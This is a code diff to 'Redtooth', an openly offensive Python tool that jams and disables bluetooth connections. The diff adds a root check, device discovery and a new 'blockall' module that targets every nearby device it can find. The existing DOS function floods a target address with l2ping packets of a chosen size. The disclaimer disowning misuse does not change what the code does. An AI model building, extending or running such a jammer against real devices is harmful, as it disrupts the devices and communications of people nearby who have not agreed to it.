@@ -7,23 +7,33 @@ import time
 import threading
 
 
+
 threads_ar = []
 global blocked_addr 
 blocked_addr = []
+global found_addr
+found_addr = []
 global packetsize
 global threads_count
 global target
-os.system("clear")
 art.tprint("Redtooth")
 print("=====================================")
 print("Author: Logan Goins\n")
+if not os.geteuid() == 0:
+    sys.exit("\nRun as root\n")
 print("Type \"help\" for more information")
-print("I am not responsible for any damages or misuse from this software.\nThis software is used at your own risk.")
+print("I am not responsible for any damages or misuse from this software.\nThis software is used at your own risk.\n")
+print("Checking if your bluetooth adapter is enabled...")
+try:
+    nearby_devices = discover_devices()
+except OSError:
+    print("Please enable your bluetooth adapter")
+    exit()
 
 
 def DOS(target, packetsize):
     subprocess.call(["l2ping", "-i", "hci0", "-s", str(packetsize), "-f", target], stdout=open(os.devnull, 'wb'))
-        
+    
 
 def jam_module():
     while True:
@@ -184,8 +194,10 @@ def main():
         if cmd == "show" and subcmd == "modules":
             print("\nModules:\n===============================")
             print("jam       ---   bluetooth connection jammer/disabler")
-            
+            print("blockall  ---   jams/disables all devices possible")
 
+        if cmd == "use" and subcmd == "blockall":
+            blockall_module()
 
         if cmd == "help" or cmd == "show" and subcmd == "options":
             help_menu()
